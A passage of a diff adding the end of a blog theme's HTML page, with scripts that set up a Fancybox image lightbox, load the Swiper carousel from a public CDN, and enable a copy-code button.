+    if (fancybox != undefined && fancybox.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
+        }
+      });
+    })
+  }
+</script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+
+</div></body></html>
